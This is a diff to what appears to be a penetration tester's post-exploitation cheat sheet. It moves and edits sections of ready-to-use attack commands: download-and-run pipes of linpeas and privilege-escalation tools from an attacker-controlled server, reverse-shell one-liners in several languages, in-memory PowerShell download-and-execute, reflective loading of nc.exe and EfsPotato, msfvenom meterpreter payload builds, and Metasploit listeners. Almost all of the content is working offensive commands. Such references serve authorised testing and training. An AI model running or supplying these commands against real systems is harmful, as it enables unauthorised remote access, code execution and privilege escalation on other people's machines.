@@ -758,18 +758,18 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 # Post-Exploitation 
-## Transfer Tools to Proxy Box
-scp -r ~/Upload user@proxybox:/
+## Start Fileserver
+python3 -m http.server 8888 -d ~/Upload
+
+## Transfer Tools to a Proxy Box
+scp -r ~/Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
 
 ## Linux
 [*] File Transfer
-scp -r ~/Upload $USERNAME@$TARGET:/
-scp -r ~/Upload/linux $USERNAME@$TARGET:/
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 curl http://$MYIP:8888/linux/linpeas.sh | sh
 c=./GTFONow.py;curl $MYIP:8888/linux/$c -O;chmod +x $c;python3 $c -a
 c=./traitor;curl $MYIP:8888/linux/$c -O;chmod +x $c;$c -a
-scp -r ~/Upload $USERNAME@$TARGET:~
 
 [*] Shells
 +---------- One Liners ----------+
@@ -782,7 +782,6 @@ ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
 +---------- Listeners ----------+
-python3 -m http.server 8888 -d ~/Upload
 rlwrap nc -lvnp 5555
 rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
 rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
@@ -870,44 +869,39 @@ curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
 
-+---------- In Memory ----------+
-powershell -c "IEX(New-Object Net.WebClient).DownloadString(http://$MYIP:8888/windows/0.ps1)"
-powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/nc.exe')"
-powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/EfsPotato.exe')"
-powershell -c "[EfsPotato]::Main(@('C:\programdata\nc.exe','$MYIP','5555','-e','cmd'))"
-
-
 [*] Shells
 +---------- Get Architecture (x86 / x64) ----------+
 wmic os get osarchitecture
 
-+---------- One Liners ----------+
++---------- In Memory ----------+
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
+powershell -c "IEX(New-Object Net.WebClient).DownloadString(http://$MYIP:8888/windows/0.ps1)"
+
++---------- Listeners ----------+
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
+
++---------- MSFVenom ----------+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o 0.aspx
+msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.php
+msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.py
+
++---------- Reverse Shells ----------+
 nc.exe $MYIP 5555 -e cmd.exe
 php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
 powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
 
-+---------- Listeners ----------+
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-python3 -m http.server 8888 -d ~/Upload
-
-rlwrap nc -lvnp 5555
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
-
-+---------- MSFVenom ----------+
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
-
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o 0.aspx
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
-
-msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.php
-msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.py
++---------- Other Memory ----------+
+powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/nc.exe')"
+powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/EfsPotato.exe')"
+powershell -c "[EfsPotato]::Main(@('C:\programdata\nc.exe','$MYIP','5555','-e','cmd'))"
 
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
